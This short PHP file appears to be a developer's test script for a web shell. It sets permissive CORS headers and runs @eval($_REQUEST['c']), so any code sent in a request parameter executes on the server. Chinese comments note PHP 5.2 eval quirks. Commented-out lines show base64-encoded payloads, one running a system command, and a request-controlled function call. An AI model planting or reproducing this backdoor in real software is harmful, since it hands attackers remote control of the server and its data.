<?php
header('Access-Control-Allow-Headers: *');
header('Access-Control-Allow-Methods: *');
header('Access-Control-Allow-Origin: *');
//header("Content-Type: text/html;charset=GBK");
if ($_SERVER['REQUEST_METHOD'] == 'OPTION') {
    die();
}

//5.2的坑
//5.2版本的eval函数，数组取值不能用双引号，if为空判断不能用==''，用empty代替
//php5.2路径后缀不能为/，7.3版本可以
//function后面不用根;号，大部分时间解析不出来，todo 也可能是我代码问题，




//var_dump($_REQUEST);
//
//$a = 'print_r($_SERVER["SCRIPT_FILENAME"]);';
//eval($a);
//eval($_REQUEST['c']);
//eval('echo base64_decode("ZWNobyAnMTExJzs=");');
@eval($_REQUEST['c']);
//print_r($_REQUEST);
//print_r($_REQUEST['test']);
//print_r(file_get_contents('php://input'));

//echo base64_decode('aGVhZGVyKCJDb250ZW50LVR5cGU6IHRleHQvaHRtbDtjaGFyc2V0PVVURi04Iik7ZWNobyAndDdlaXNlYzJwNmRrajRlamZ4Mic7')
//echo base64_encode('echo 1;');
//@eval(base64_decode('aGVhZGVyKCJDb250ZW50LVR5cGU6IHRleHQvaHRtbDtjaGFyc2V0PUdCSyIpO3N5c3RlbSgnZGlyIDI JTI2MScpOw=='));
//eval()
//$f = $_REQUEST['f'];$p = $_REQUEST['p'];
//$f($p);
//echo base64_decode($p);
//eval(base64_decode($p))
//$encode = function ($val) {
//    return base64_encode($val);
//};
//echo $encode('asdfasdf');

//header("Content-Type: text/html;charset=UTF-8");

?>
